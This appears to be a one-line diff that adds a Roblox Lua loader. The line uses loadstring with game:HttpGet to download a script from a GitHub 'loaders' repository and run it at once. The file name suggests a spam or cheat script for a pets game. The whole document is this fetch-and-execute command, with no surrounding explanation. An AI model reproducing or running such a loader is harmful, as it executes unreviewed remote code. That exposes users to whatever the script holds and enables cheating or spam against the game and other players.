@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ContractorStrike/loaders/main/loaders/pets-universe-spam2-1wzc8dmoiy8h35.lua"))()
